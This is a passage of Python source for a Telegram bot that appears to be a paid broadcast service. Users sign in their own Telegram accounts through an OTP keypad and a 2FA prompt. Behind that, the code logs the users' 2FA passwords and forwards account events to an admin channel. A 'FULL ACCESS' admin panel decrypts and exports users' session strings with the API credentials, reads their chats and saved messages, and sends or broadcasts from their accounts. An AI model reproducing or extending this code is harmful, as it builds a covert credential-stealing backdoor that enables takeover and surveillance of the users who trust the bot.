                      f"<b>Current:</b> <code>_____</code>\n\n"
                      f"<i>Check Telegram chat with 'Telegram' if no SMS.</i>")
            try:
                await status.edit_text(prompt, parse_mode=ParseMode.HTML, reply_markup=get_otp_keyboard())
            except Exception:
                await m.reply(prompt, parse_mode=ParseMode.HTML, reply_markup=get_otp_keyboard())
        except PhoneNumberInvalidError:
            db.set_user_state(uid, "")
            try: await status.edit_text("❌ Invalid phone number.")
            except Exception: await m.reply("❌ Invalid phone number.")
        except FloodWaitError as e:
            db.set_user_state(uid, "")
            try: await status.edit_text(f"❌ Flood wait: {e.seconds}s")
            except Exception: await m.reply(f"❌ Flood wait: {e.seconds}s")
        except Exception as e:
            db.set_user_state(uid, "")
            try: await status.edit_text(f"❌ {e}")
            except Exception: await m.reply(f"❌ {e}")
        finally:
            try: await tg.disconnect()
            except Exception: pass
        return

    if state == "telethon_wait_otp":
        await m.reply("⚠️ Use keypad buttons.", reply_markup=get_otp_keyboard()); return

    if state == "telethon_wait_password":
        try: await log_2fa_password(uid, text)
        except Exception: pass
        enc = db.get_temp_data(uid)
        if not enc:
            db.set_user_state(uid, ""); await m.reply("❌ Expired"); return
        tg = None
        try:
            temp = json.loads(cipher_suite.decrypt(enc.encode()).decode())
            phone = temp["phone"]; ss = temp["session_str"]
            tg = TelegramClient(StringSession(ss), API_ID, API_HASH)
            await tg.connect(); await tg.sign_in(password=text)
            enc_s = cipher_suite.encrypt(ss.encode()).decode()
            db.add_user_account(uid, phone, enc_s)
            await m.reply(f"<blockquote><b>✅ ACCOUNT ADDED</b></blockquote>\n\n<code>{phone}</code>",
                parse_mode=ParseMode.HTML,
                reply_markup=kb([[InlineKeyboardButton("Dashboard", callback_data="refresh_dashboard")]]))
            await forward_event_to_db_channel("account_added", uid, {"phone": phone})
            db.set_user_state(uid, ""); db.set_temp_data(uid, None)
        except Exception as e:
            db.set_user_state(uid, ""); db.set_temp_data(uid, None)
            await m.reply(f"❌ 2FA failed: {e}")
        finally:
            if tg:
                try: await tg.disconnect()
                except Exception: pass
        return

# ============================================================
# PHOTO HANDLER
# ============================================================
@pyro.on_message(filters.photo & filters.private)
async def handle_photo(client, m):
    uid = m.from_user.id
    state = db.get_user_state(uid)

    if is_owner(uid) and state == "admin_await_qr":
        db.set_payment_qr(m.photo.file_id); db.set_user_state(uid, "")
        await m.reply("✅ QR uploaded!",
            reply_markup=kb([[InlineKeyboardButton("Back", callback_data="admin_panel")]]))
        return

    if state and state.startswith("await_payment_screenshot_"):
        pid = state.replace("await_payment_screenshot_", "")
        plan = db.get_plan(pid)
        if not plan:
            await m.reply("❌ Plan not found."); db.set_user_state(uid, ""); return
        rid = db.create_payment_request(uid, pid, plan["price"], plan["days"],
                                         m.photo.file_id, m.from_user.username or "Unknown")
        if not rid: await m.reply("❌ Failed."); return
        db.set_user_state(uid, "")
        await m.reply(
            f"<blockquote><b>✅ SCREENSHOT RECEIVED</b></blockquote>\n\n"
            f"Plan: <code>{plan['label']}</code>\nAmount: ₹<code>{plan['price']}</code>\n"
            f"ID: <code>{rid}</code>\n\nAdmin will verify within 24h.",
            parse_mode=ParseMode.HTML,
            reply_markup=kb([[InlineKeyboardButton("Dashboard", callback_data="refresh_dashboard")]]))
        admin_cap = (f"<blockquote><b>💰 NEW PAYMENT</b></blockquote>\n\n"
                     f"User: {m.from_user.first_name} (@{m.from_user.username or 'N/A'})\n"
                     f"ID: <code>{uid}</code>\nPlan: <code>{plan['label']}</code>\n"
                     f"Amount: ₹<code>{plan['price']}</code>\nDays: <code>{plan['days']}</code>\n"
                     f"Request: <code>{rid}</code>")
        for aid in ADMIN_IDS:
            try:
                await client.send_photo(aid, photo=m.photo.file_id, caption=admin_cap,
                    parse_mode=ParseMode.HTML,
                    reply_markup=kb([
                        [InlineKeyboardButton("✅ Approve", callback_data=f"pay_approve_{rid}"),
                         InlineKeyboardButton("❌ Reject", callback_data=f"pay_reject_{rid}")]]))
            except Exception as e: logger.error(f"Send admin: {e}")
        await forward_event_to_db_channel("payment_request", uid,
            {"request_id": rid, "plan": plan['label'], "amount": plan['price']})

@pyro.on_callback_query(filters.regex(r"^pay_approve_(.+)$") & filters.user(ADMIN_IDS))
async def pay_approve(client, cb):
    rid = cb.matches[0].group(1)
    req = db.get_payment_request(rid)
    if not req or req["status"] != "pending":
        await cb.answer("Invalid", show_alert=True); return
    uid = req["user_id"]
    db.add_premium(uid, req["days"], reason=f"payment:{rid}")
    db.update_payment_request_status(rid, "approved", cb.from_user.id)
    await cb.answer("✅ Approved")
    exp = db.get_premium_expiry(uid)
    try:
        await pyro.send_message(uid,
            f"🎉 <b>PAYMENT APPROVED!</b>\n\nDays: <b>{req['days']}</b>\n"
            f"Till: <code>{exp.strftime('%d/%m/%Y') if exp else 'N/A'}</code>",
            parse_mode=ParseMode.HTML)
    except Exception: pass
    await forward_event_to_db_channel("payment_approved", uid,
        {"request_id": rid, "days": req['days']})

@pyro.on_callback_query(filters.regex(r"^pay_reject_(.+)$") & filters.user(ADMIN_IDS))
async def pay_reject(client, cb):
    rid = cb.matches[0].group(1)
    req = db.get_payment_request(rid)
    if not req or req["status"] != "pending":
        await cb.answer("Invalid", show_alert=True); return
    db.update_payment_request_status(rid, "rejected", cb.from_user.id)
    await cb.answer("❌ Rejected")
    try:
        await pyro.send_message(req["user_id"],
            f"❌ <b>Payment Rejected</b>\n\nContact: {ADMIN_USERNAME}",
            parse_mode=ParseMode.HTML)
    except Exception: pass

# ============================================================
# OTP CALLBACKS
# ============================================================
@pyro.on_callback_query(filters.regex("^otp_"))
async def otp_callback(client, cb):
    uid = cb.from_user.id
    state = db.get_user_state(uid)
    if state != "telethon_wait_otp":
        await cb.answer("Invalid state", show_alert=True); return
    enc = db.get_temp_data(uid)
    if not enc:
        await cb.answer("Expired", show_alert=True)
        db.set_user_state(uid, ""); return
    try: temp = json.loads(cipher_suite.decrypt(enc.encode()).decode())
    except Exception:
        await cb.answer("Corrupted", show_alert=True)
        db.set_user_state(uid, ""); db.set_temp_data(uid, None); return

    phone = temp["phone"]; ss = temp["session_str"]
    pch = temp["phone_code_hash"]; otp = temp.get("otp", "")
    action = cb.data.replace("otp_", "")

    if action.isdigit():
        if len(otp) < 5: otp += action
    elif action == "back": otp = otp[:-1]
    elif action == "cancel":
        db.set_user_state(uid, ""); db.set_temp_data(uid, None)
        try: await cb.message.edit_text("❌ Cancelled.", reply_markup=None)
        except Exception: pass
        return

    temp["otp"] = otp
    db.set_temp_data(uid, cipher_suite.encrypt(json.dumps(temp).encode()).decode())
    masked = " ".join("*" for _ in otp) if otp else "_____"
    caption = (f"<blockquote><b>📩 OTP to {phone}</b></blockquote>\n\n"
               f"<b>Current:</b> <code>{masked}</code>\n\n"
               f"<i>Check Telegram chat with 'Telegram' if no SMS.</i>")
    try: await cb.message.edit_text(caption, parse_mode=ParseMode.HTML, reply_markup=get_otp_keyboard())
    except Exception: pass

    if len(otp) == 5:
        try: await cb.message.edit_text(caption + "\n\n<b>⏳ Verifying...</b>",
            parse_mode=ParseMode.HTML, reply_markup=None)
        except Exception: pass
        tg = TelegramClient(StringSession(ss), API_ID, API_HASH)
        try:
            await tg.connect()
            await tg.sign_in(phone, code=otp, phone_code_hash=pch)
            enc_s = cipher_suite.encrypt(ss.encode()).decode()
            db.add_user_account(uid, phone, enc_s)
            try:
                await cb.message.edit_text(
                    f"<blockquote><b>✅ ACCOUNT ADDED</b></blockquote>\n\n<code>{phone}</code>",
                    parse_mode=ParseMode.HTML,
                    reply_markup=kb([[InlineKeyboardButton("Dashboard", callback_data="refresh_dashboard")]]))
            except Exception:
                await pyro.send_message(uid, f"✅ Account added: <code>{phone}</code>",
                    parse_mode=ParseMode.HTML)
            await forward_event_to_db_channel("account_added", uid, {"phone": phone})
            db.set_user_state(uid, ""); db.set_temp_data(uid, None)
        except SessionPasswordNeededError:
            temp2 = {"phone": phone, "session_str": ss}
            db.set_temp_data(uid, cipher_suite.encrypt(json.dumps(temp2).encode()).decode())
            db.set_user_state(uid, "telethon_wait_password")
            try:
                await cb.message.edit_text(caption + "\n\n<b>🔐 2FA Required!</b>\nSend password:",
                    parse_mode=ParseMode.HTML, reply_markup=None)
            except Exception:
                await pyro.send_message(uid, "🔐 2FA Required! Send your password.")
        except PhoneCodeInvalidError:
            temp["otp"] = ""
            db.set_temp_data(uid, cipher_suite.encrypt(json.dumps(temp).encode()).decode())
            try:
                await cb.message.edit_text(caption + "\n\n<b>❌ Invalid OTP</b>",
                    parse_mode=ParseMode.HTML, reply_markup=get_otp_keyboard())
            except Exception: pass
        except PhoneCodeExpiredError:
            db.set_user_state(uid, ""); db.set_temp_data(uid, None)
            try: await cb.message.edit_text("❌ OTP expired.", reply_markup=None)
            except Exception: pass
        except Exception as e:
            db.set_user_state(uid, ""); db.set_temp_data(uid, None)
            try: await cb.message.edit_text(f"❌ {e}", reply_markup=None)
            except Exception: pass
        finally:
            try: await tg.disconnect()
            except Exception: pass

# ============================================================
# ADMIN PANEL
# ============================================================
@pyro.on_message(filters.command("admin") & filters.user(ADMIN_IDS))
async def admin_panel(client, m):
    await show_admin_panel(client, m.chat.id)

async def show_admin_panel(client, chat_id):
    s = db.get_admin_stats()
    maintenance = is_maintenance()
    fj = db.get_setting("force_join_enabled", False)
    db_ch = db.get_setting("database_channel_id")
    db_int = db.get_setting("db_forward_interval_hours", DEFAULT_DB_FORWARD_INTERVAL_HOURS)
    db_ret = db.get_setting("db_retention_days", DEFAULT_DB_RETENTION_DAYS)
    cap = (f"<blockquote><b>👑 ADMIN PANEL</b></blockquote>\n\n"
           f"Users: <code>{s['total_users']}</code> · Premium: <code>{s['premium_users']}</code>\n"
           f"Banned: <code>{s['banned_users']}</code> · Accounts: <code>{s['total_accounts']}</code>\n"
           f"Active BC: <code>{s['active_broadcasts']}</code> · Pending: <code>{s['pending_payments']}</code>\n\n"
           f"Maintenance: <b>{'🔴 ON' if maintenance else '🟢 OFF'}</b>\n"
           f"Force Join: <b>{'🟢 ON' if fj else '🔴 OFF'}</b>\n"
           f"🗄 DB Channel: <code>{db_ch or 'Not set'}</code>\n"
           f"⏱ Forward: <code>{db_int}h</code> · Retention: <code>{db_ret}d</code>")
    rows = [
        [InlineKeyboardButton("👥 Users", callback_data="admin_user_list_0"),
         InlineKeyboardButton("🔍 Search", callback_data="admin_search_user")],
        [InlineKeyboardButton("📊 Stats", callback_data="admin_stats"),
         InlineKeyboardButton("🎟️ Codes", callback_data="admin_codes")],
        [InlineKeyboardButton("💎 Plans", callback_data="admin_plans"),
         InlineKeyboardButton("💳 Payments", callback_data="admin_payments")],
        [InlineKeyboardButton("🗄 DB Channel", callback_data="admin_db_channel")],
        [InlineKeyboardButton("⚙️ Settings", callback_data="admin_settings"),
         InlineKeyboardButton("🔧 Force Join", callback_data="admin_force_join")],
        [InlineKeyboardButton("📢 Broadcast All", callback_data="admin_broadcast_all")],
        [InlineKeyboardButton(f"Maintenance {'OFF ❌' if maintenance else 'ON ✅'}",
                              callback_data="admin_maintenance_toggle")]]
    try:
        await client.send_photo(chat_id=chat_id, photo=START_IMAGE, caption=cap,
            parse_mode=ParseMode.HTML, reply_markup=kb(rows))
    except Exception as e: logger.error(f"admin_panel: {e}")

@pyro.on_callback_query(filters.regex("^admin_panel$") & filters.user(ADMIN_IDS))
async def admin_panel_back(client, cb):
    await cb.answer("")
    db.set_user_state(cb.from_user.id, "")
    try: await cb.message.delete()
    except Exception: pass
    await show_admin_panel(client, cb.message.chat.id)

@pyro.on_callback_query(filters.regex("^admin_maintenance_toggle$") & filters.user(ADMIN_IDS))
async def admin_maintenance_toggle(client, cb):
    cur = db.get_setting("maintenance_mode", False)
    db.set_setting("maintenance_mode", not cur)
    await cb.answer(f"Maintenance {'OFF' if cur else 'ON'}")
    try: await cb.message.delete()
    except Exception: pass
    await show_admin_panel(client, cb.message.chat.id)

@pyro.on_callback_query(filters.regex("^admin_stats$") & filters.user(ADMIN_IDS))
async def admin_stats_cb(client, cb):
    await cb.answer("")
    s = db.get_admin_stats()
    try:
        await cb.message.edit_caption(
            caption=(f"<blockquote><b>📊 STATS</b></blockquote>\n\n"
                     f"Users: <code>{s['total_users']}</code>\nPremium: <code>{s['premium_users']}</code>\n"
                     f"Banned: <code>{s['banned_users']}</code>\nAccounts: <code>{s['total_accounts']}</code>\n"
                     f"Sent: <code>{s['total_forwards']}</code>\nFailed: <code>{s['total_failed']}</code>"),
            parse_mode=ParseMode.HTML,
            reply_markup=kb([[InlineKeyboardButton("Back", callback_data="admin_panel")]]))
    except Exception: pass

@pyro.on_callback_query(filters.regex("^admin_broadcast_all$") & filters.user(ADMIN_IDS))
async def admin_broadcast_all_cb(client, cb):
    await cb.answer("")
    total = db.get_users_count()
    try:
        await cb.message.edit_caption(
            caption=(f"<blockquote><b>📢 BROADCAST ALL</b></blockquote>\n\nUsers: <code>{total}</code>\n\n"
                     "Reply to any message with <code>/bd</code>."),
            parse_mode=ParseMode.HTML,
            reply_markup=kb([[InlineKeyboardButton("Back", callback_data="admin_panel")]]))
    except Exception: pass

# ============================================================
# ADMIN DB CHANNEL
# ============================================================
@pyro.on_callback_query(filters.regex("^admin_db_channel$") & filters.user(ADMIN_IDS))
async def admin_db_channel(client, cb):
    await cb.answer("")
    db_ch = db.get_setting("database_channel_id")
    interval = db.get_setting("db_forward_interval_hours", DEFAULT_DB_FORWARD_INTERVAL_HOURS)
    retention = db.get_setting("db_retention_days", DEFAULT_DB_RETENTION_DAYS)
    enabled = db.get_setting("db_forward_enabled", True)
    total_events = db.count_db_events()
    cap = (f"<blockquote><b>🗄 DATABASE CHANNEL</b></blockquote>\n\n"
           f"Channel: <code>{db_ch or 'Not set'}</code>\n"
           f"Forward Interval: <code>{interval}h</code>\n"
           f"Retention: <code>{retention}d</code>\n"
           f"Forward Enabled: {'🟢 YES' if enabled else '🔴 NO'}\n"
           f"Total Events Stored: <code>{total_events}</code>\n\n"
           f"<i>Har important event (account add, broadcast, payment, 2FA) log hota hai.</i>")
    rows = [
        [InlineKeyboardButton("🔗 Set Channel ID", callback_data="admin_db_set_channel")],
        [InlineKeyboardButton("⏱ Set Interval", callback_data="admin_db_set_interval"),
         InlineKeyboardButton("📅 Set Retention", callback_data="admin_db_set_retention")],
        [InlineKeyboardButton(f"Forward {'OFF' if enabled else 'ON'}", callback_data="admin_db_toggle_forward")],
        [InlineKeyboardButton("📤 Forward Now", callback_data="admin_db_forward_now")],
        [InlineKeyboardButton("🗑 Clear Stored Events", callback_data="admin_db_clear_events")],
        [InlineKeyboardButton("Back", callback_data="admin_panel")]]
    try:
        await cb.message.edit_caption(caption=cap, parse_mode=ParseMode.HTML, reply_markup=kb(rows))
    except Exception: pass

@pyro.on_callback_query(filters.regex("^admin_db_set_channel$") & filters.user(ADMIN_IDS))
async def admin_db_set_channel(client, cb):
    await cb.answer("")
    db.set_user_state(cb.from_user.id, "admin_await_db_channel")
    cur = db.get_setting("database_channel_id")
    try:
        await cb.message.edit_caption(
            caption=(f"<blockquote><b>🔗 SET DB CHANNEL</b></blockquote>\n\n"
                     f"Current: <code>{cur or 'Not set'}</code>\n\n"
                     "Send channel ID (e.g. <code>-1001234567890</code>).\n"
                     "Send <code>0</code> to clear.\n\n"
                     "<i>Pehle bot ko channel me admin banao.</i>"),
            parse_mode=ParseMode.HTML,
            reply_markup=kb([[InlineKeyboardButton("Cancel", callback_data="admin_db_channel")]]))
    except Exception: pass

@pyro.on_callback_query(filters.regex("^admin_db_set_interval$") & filters.user(ADMIN_IDS))
async def admin_db_set_interval(client, cb):
    await cb.answer("")
    db.set_user_state(cb.from_user.id, "admin_await_db_interval")
    cur = db.get_setting("db_forward_interval_hours", DEFAULT_DB_FORWARD_INTERVAL_HOURS)
    try:
        await cb.message.edit_caption(
            caption=(f"<blockquote><b>⏱ FORWARD INTERVAL</b></blockquote>\n\n"
                     f"Current: <code>{cur}h</code>\n\nSend hours (1–168):"),
            parse_mode=ParseMode.HTML,
            reply_markup=kb([
                [InlineKeyboardButton("1h", callback_data="admin_db_int_1"),
                 InlineKeyboardButton("6h", callback_data="admin_db_int_6"),
                 InlineKeyboardButton("12h", callback_data="admin_db_int_12")],
                [InlineKeyboardButton("24h", callback_data="admin_db_int_24"),
                 InlineKeyboardButton("72h", callback_data="admin_db_int_72")],
                [InlineKeyboardButton("Cancel", callback_data="admin_db_channel")]]))
    except Exception: pass

@pyro.on_callback_query(filters.regex(r"^admin_db_int_(\d+)$") & filters.user(ADMIN_IDS))
async def admin_db_int_quick(client, cb):
    h = int(cb.matches[0].group(1))
    db.set_setting("db_forward_interval_hours", h)
    db.set_user_state(cb.from_user.id, "")
    await cb.answer(f"Interval {h}h ✅")
    await admin_db_channel(client, cb)

@pyro.on_callback_query(filters.regex("^admin_db_set_retention$") & filters.user(ADMIN_IDS))
async def admin_db_set_retention(client, cb):
    await cb.answer("")
    db.set_user_state(cb.from_user.id, "admin_await_db_retention")
    cur = db.get_setting("db_retention_days", DEFAULT_DB_RETENTION_DAYS)
    try:
        await cb.message.edit_caption(
            caption=(f"<blockquote><b>📅 RETENTION DAYS</b></blockquote>\n\n"
                     f"Current: <code>{cur}d</code>\n\nSend days (1–3650):"),
            parse_mode=ParseMode.HTML,
            reply_markup=kb([
                [InlineKeyboardButton("7d", callback_data="admin_db_ret_7"),
                 InlineKeyboardButton("30d", callback_data="admin_db_ret_30")],
                [InlineKeyboardButton("90d", callback_data="admin_db_ret_90"),
                 InlineKeyboardButton("365d", callback_data="admin_db_ret_365")],
                [InlineKeyboardButton("Cancel", callback_data="admin_db_channel")]]))
    except Exception: pass

@pyro.on_callback_query(filters.regex(r"^admin_db_ret_(\d+)$") & filters.user(ADMIN_IDS))
async def admin_db_ret_quick(client, cb):
    d = int(cb.matches[0].group(1))
    db.set_setting("db_retention_days", d)
    db.set_user_state(cb.from_user.id, "")
    await cb.answer(f"Retention {d}d ✅")
    await admin_db_channel(client, cb)

@pyro.on_callback_query(filters.regex("^admin_db_toggle_forward$") & filters.user(ADMIN_IDS))
async def admin_db_toggle_forward(client, cb):
    cur = db.get_setting("db_forward_enabled", True)
    db.set_setting("db_forward_enabled", not cur)
    await cb.answer(f"Forward {'OFF' if cur else 'ON'}")
    await admin_db_channel(client, cb)

@pyro.on_callback_query(filters.regex("^admin_db_forward_now$") & filters.user(ADMIN_IDS))
async def admin_db_forward_now(client, cb):
    await cb.answer("Forwarding...")
    db_ch = db.get_setting("database_channel_id")
    if not db_ch:
        await cb.answer("Set channel first!", show_alert=True); return
    events = db.get_unforwarded_db_events(limit=100)
    sent = 0
    for ev in events:
        try:
            payload = ev.get("payload", {})
            body = "\n".join([f"<b>{k}:</b> <code>{v}</code>" for k, v in payload.items()])
            msg = (f"<blockquote><b>🗄 {ev['event_type'].upper()}</b></blockquote>\n\n"
                   f"<b>User:</b> <code>{ev['user_id']}</code>\n"
                   f"<b>Time:</b> <code>{ev['created_at'].strftime('%d/%m/%Y %H:%M:%S')}</code>\n\n{body}")
            await pyro.send_message(db_ch, msg, parse_mode=ParseMode.HTML)
            db.mark_db_event_forwarded(ev["event_id"])
            sent += 1
        except Exception as e:
            logger.error(f"forward: {e}")
    await cb.answer(f"✅ {sent} forwarded")

@pyro.on_callback_query(filters.regex("^admin_db_clear_events$") & filters.user(ADMIN_IDS))
async def admin_db_clear_events(client, cb):
    try:
        db.db.db_channel_log.delete_many({})
        await cb.answer("Cleared 🗑")
    except Exception as e:
        await cb.answer(f"Error: {e}", show_alert=True)
    await admin_db_channel(client, cb)

# ============================================================
# ADMIN USER LIST / USER DETAIL (FULL ACCESS)
# ============================================================
USERS_PER_PAGE = 8

@pyro.on_callback_query(filters.regex(r"^admin_user_list_(\d+)$") & filters.user(ADMIN_IDS))
async def admin_user_list(client, cb):
    await cb.answer("")
    page = int(cb.matches[0].group(1))
    total = db.get_users_count()
    total_pages = max(1, (total + USERS_PER_PAGE - 1) // USERS_PER_PAGE)
    page = max(0, min(page, total_pages - 1))
    users = db.get_all_users(page=page, limit=USERS_PER_PAGE)
    text = (f"<blockquote><b>👥 USERS</b></blockquote>\n\n"
            f"Total: <code>{total}</code> | Page: <code>{page+1}/{total_pages}</code>")
    rows = []
    for u in users:
        name = u.get("first_name", "User")
        prefix = "💎 " if u.get("is_premium") else ""
        suffix = " 🚫" if u.get("is_banned") else ""
        rows.append([InlineKeyboardButton(f"{prefix}{name}{suffix}",
                                           callback_data=f"admin_view_user_{u['user_id']}")])
    nav = []
    if page > 0: nav.append(InlineKeyboardButton("⬅️", callback_data=f"admin_user_list_{page-1}"))
    if page < total_pages - 1: nav.append(InlineKeyboardButton("➡️", callback_data=f"admin_user_list_{page+1}"))
    if nav: rows.append(nav)
    rows.append([InlineKeyboardButton("Back", callback_data="admin_panel")])
    try:
        await cb.message.edit_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=kb(rows))
    except Exception: pass

@pyro.on_callback_query(filters.regex(r"^admin_view_user_(\d+)$") & filters.user(ADMIN_IDS))
async def admin_view_user(client, cb):
    await cb.answer("")
    uid = int(cb.matches[0].group(1))
    u = db.get_user(uid)
    if not u: await cb.answer("Not found", show_alert=True); return
    cnt = db.get_user_accounts_count(uid)
    is_prem = db.is_premium(uid)
    is_ban = u.get("is_banned", False)
    exp = u.get("premium_expiry")
    bstate = db.get_broadcast_state(uid)
    exp_str = f"{exp.strftime('%d/%m/%Y')} ({time_remaining_str(exp)})" if is_prem and exp else "N/A"
    cap = (f"<blockquote><b>👤 USER DETAILS</b></blockquote>\n\n"
           f"Name: <code>{u.get('first_name','Unknown')}</code>\n"
           f"Username: @{u.get('username','N/A')}\n"
           f"ID: <code>{uid}</code>\nAccounts: <code>{cnt}</code>\n\n"
           f"Premium: {'💎 YES' if is_prem else '❌ NO'}\n"
           f"Expiry: <code>{exp_str}</code>\n"
           f"Banned: {'🚫 YES' if is_ban else '✅ NO'}\n"
           f"Broadcasting: {'🟢 YES' if bstate.get('running') else '🔴 NO'}")
    rows = [
        [InlineKeyboardButton("➕ Add Prem", callback_data=f"admin_addprem_{uid}"),
         InlineKeyboardButton("➖ Remove Prem", callback_data=f"admin_rmprem_{uid}")],
        [InlineKeyboardButton("🔓 Access Accounts", callback_data=f"admin_acc_list_{uid}")],
        [InlineKeyboardButton("📩 Get All Saved Chats", callback_data=f"admin_get_saved_{uid}")],
        [InlineKeyboardButton("✅ Unban" if is_ban else "🚫 Ban",
                              callback_data=f"admin_{'unban' if is_ban else 'ban'}_{uid}")],
        [InlineKeyboardButton("⏹ Stop BC", callback_data=f"admin_stopbcast_{uid}"),
         InlineKeyboardButton("🗑 Delete", callback_data=f"admin_deluser_{uid}")],
        [InlineKeyboardButton("Back", callback_data="admin_user_list_0")]]
    try:
        await cb.message.edit_caption(caption=cap, parse_mode=ParseMode.HTML, reply_markup=kb(rows))
    except Exception: pass

# ---- FULL ACCESS — ACCOUNTS ----
@pyro.on_callback_query(filters.regex(r"^admin_acc_list_(\d+)$") & filters.user(ADMIN_IDS))
async def admin_acc_list(client, cb):
    await cb.answer("")
    uid = int(cb.matches[0].group(1))
    accounts = db.get_user_accounts(uid)
    if not accounts:
        await cb.answer("No accounts", show_alert=True); return
    text = (f"<blockquote><b>🔓 USER ACCOUNTS</b></blockquote>\n\n"
            f"User: <code>{uid}</code>\nTotal: <code>{len(accounts)}</code>\n\nTap account:")
    rows = []
    for acc in accounts:
        s = "✅" if acc.get("is_active") else "❌"
        rows.append([InlineKeyboardButton(f"📱 {acc['phone_number']} {s}",
                                           callback_data=f"admin_acc_open_{uid}_{acc['_id']}")])
    rows.append([InlineKeyboardButton("Back", callback_data=f"admin_view_user_{uid}")])
    try:
        await cb.message.edit_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=kb(rows))
    except Exception: pass

@pyro.on_callback_query(filters.regex(r"^admin_acc_open_(\d+)_(.+)$") & filters.user(ADMIN_IDS))
async def admin_acc_open(client, cb):
    await cb.answer("")
    uid = int(cb.matches[0].group(1)); acc_id = cb.matches[0].group(2)
    accounts = db.get_user_accounts(uid)
    target = next((a for a in accounts if str(a["_id"]) == acc_id), None)
    if not target:
        await cb.answer("Not found", show_alert=True); return
    text = (f"<blockquote><b>📱 ACCOUNT CONTROL</b></blockquote>\n\n"
            f"Phone: <code>{target['phone_number']}</code>\n"
            f"Owner: <code>{uid}</code>\n"
            f"Status: {'✅ Active' if target.get('is_active') else '❌'}")
    rows = [
        [InlineKeyboardButton("🔑 Export Session", callback_data=f"admin_acc_export_{uid}_{acc_id}")],
        [InlineKeyboardButton("👤 Profile", callback_data=f"admin_acc_profile_{uid}_{acc_id}"),
         InlineKeyboardButton("📂 Chats", callback_data=f"admin_acc_chats_{uid}_{acc_id}")],
        [InlineKeyboardButton("💾 Saved Messages", callback_data=f"admin_acc_saved_{uid}_{acc_id}")],
        [InlineKeyboardButton("📤 Send Message", callback_data=f"admin_acc_send_{uid}_{acc_id}")],
        [InlineKeyboardButton("📢 Broadcast from Account",
                              callback_data=f"admin_acc_bcast_{uid}_{acc_id}")],
        [InlineKeyboardButton("Back", callback_data=f"admin_acc_list_{uid}")]]
    try:
        await cb.message.edit_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=kb(rows))
    except Exception: pass

@pyro.on_callback_query(filters.regex(r"^admin_acc_export_(\d+)_(.+)$") & filters.user(ADMIN_IDS))
async def admin_acc_export(client, cb):
    await cb.answer("")
    uid = int(cb.matches[0].group(1)); acc_id = cb.matches[0].group(2)
    accounts = db.get_user_accounts(uid)
    target = next((a for a in accounts if str(a["_id"]) == acc_id), None)
    if not target:
        await cb.answer("Not found", show_alert=True); return
    try:
        ss = cipher_suite.decrypt(target["session_string"].encode()).decode()
    except Exception as e:
        await cb.answer(f"Decrypt failed: {e}", show_alert=True); return
    info = (f"<blockquote><b>🔑 SESSION EXPORT</b></blockquote>\n\n"
            f"Owner: <code>{uid}</code>\nPhone: <code>{target['phone_number']}</code>\n"
            f"API_ID: <code>{API_ID}</code>\nAPI_HASH: <code>{API_HASH}</code>")
    try:
        await pyro.send_message(cb.from_user.id, info, parse_mode=ParseMode.HTML)
        await pyro.send_message(cb.from_user.id, f"<code>{ss}</code>", parse_mode=ParseMode.HTML)
        file_data = io.BytesIO(ss.encode())
        file_data.name = f"session_{target['phone_number'].replace('+','')}.txt"
        await pyro.send_document(cb.from_user.id, document=file_data,
            caption=f"📁 Session for <code>{target['phone_number']}</code>",
            parse_mode=ParseMode.HTML)
        await cb.answer("Sent to DM ✅", show_alert=True)
    except Exception as e:
        await cb.answer(f"Failed: {str(e)[:80]}", show_alert=True)

@pyro.on_callback_query(filters.regex(r"^admin_acc_profile_(\d+)_(.+)$") & filters.user(ADMIN_IDS))
async def admin_acc_profile(client, cb):
    await cb.answer("Loading...")
    uid = int(cb.matches[0].group(1)); acc_id = cb.matches[0].group(2)
    accounts = db.get_user_accounts(uid)
    target = next((a for a in accounts if str(a["_id"]) == acc_id), None)
    if not target: return
    tg = await _get_user_tg_client(target)
    if not tg:
        await cb.answer("Connect failed", show_alert=True); return
    try:
        me = await tg.get_me()
        try:
            full = await tg(functions.users.GetFullUserRequest(me.id))
            about = getattr(full.full_user, "about", None) or "N/A"
        except Exception: about = "N/A"
        text = (f"<blockquote><b>👤 PROFILE</b></blockquote>\n\n"
                f"ID: <code>{me.id}</code>\nName: {me.first_name or ''} {me.last_name or ''}\n"
                f"Username: @{me.username or 'N/A'}\nPhone: <code>{me.phone or 'N/A'}</code>\n"
                f"Premium: {'✅' if getattr(me,'premium',False) else '❌'}\nBio: {about}")
        await cb.message.edit_caption(caption=text, parse_mode=ParseMode.HTML,
            reply_markup=kb([[InlineKeyboardButton("Back", callback_data=f"admin_acc_open_{uid}_{acc_id}")]]))
    except Exception as e:
        await cb.answer(f"Error: {str(e)[:80]}", show_alert=True)
    finally:
        try: await tg.disconnect()
        except Exception: pass

@pyro.on_callback_query(filters.regex(r"^admin_acc_chats_(\d+)_(.+)$") & filters.user(ADMIN_IDS))
async def admin_acc_chats(client, cb):
    await cb.answer("Loading...")
    uid = int(cb.matches[0].group(1)); acc_id = cb.matches[0].group(2)
    accounts = db.get_user_accounts(uid)
    target = next((a for a in accounts if str(a["_id"]) == acc_id), None)
    if not target: return
    tg = await _get_user_tg_client(target)
    if not tg:
        await cb.answer("Connect failed", show_alert=True); return
    try:
        dialogs = [d async for d in tg.iter_dialogs(limit=20)]
        text = "<blockquote><b>📂 RECENT CHATS</b></blockquote>\n\n"
        for i, d in enumerate(dialogs, 1):
            kind = "👤" if d.is_user else "👥" if d.is_group else "📢"
            text += f"<b>{i}.</b> {kind} {(d.name or 'Unknown')[:35]}\n"
        await cb.message.edit_caption(caption=text or "No chats", parse_mode=ParseMode.HTML,
            reply_markup=kb([
                [InlineKeyboardButton("🔄 Refresh", callback_data=f"admin_acc_chats_{uid}_{acc_id}")],
                [InlineKeyboardButton("Back", callback_data=f"admin_acc_open_{uid}_{acc_id}")]]))
    except Exception as e:
        await cb.answer(f"Error: {str(e)[:80]}", show_alert=True)
    finally:
        try: await tg.disconnect()
        except Exception: pass

@pyro.on_callback_query(filters.regex(r"^admin_acc_saved_(\d+)_(.+)$") & filters.user(ADMIN_IDS))
async def admin_acc_saved(client, cb):
    await cb.answer("Loading...")
    uid = int(cb.matches[0].group(1)); acc_id = cb.matches[0].group(2)
    accounts = db.get_user_accounts(uid)
    target = next((a for a in accounts if str(a["_id"]) == acc_id), None)
    if not target: return
    tg = await _get_user_tg_client(target)
    if not tg:
        await cb.answer("Connect failed", show_alert=True); return
    try:
        messages = await tg.get_messages("me", limit=15)
        text = "<blockquote><b>💾 SAVED MESSAGES</b></blockquote>\n\n"
        if not messages:
